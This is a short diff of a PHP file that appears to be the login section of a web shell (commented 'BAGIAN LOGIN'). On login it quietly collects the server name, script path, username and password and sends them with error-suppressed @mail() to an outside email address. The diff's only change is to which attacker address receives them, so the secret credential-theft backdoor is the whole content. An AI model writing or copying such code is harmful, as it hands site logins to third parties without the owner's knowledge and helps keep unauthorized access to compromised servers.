@@ -19,7 +19,7 @@ if (array_key_exists('loginin', $_POST)) {
 		$server_name = $_SERVER['SERVER_NAME'];
 		$php_self = $_SERVER['PHP_SELF'];
 		$report_bug = "Login: $server_name$php_self\nUser: $user\nPass: $password";
-		@mail('natsumekunnn@proton.me', 'lol', $report_bug);
+		@mail('ribelcyberteam@gmail.com', 'lol', $report_bug);
 		}
 // ================ BAGIAN LOGIN ================
 if (!isset($_SESSION['logged_in'])) {
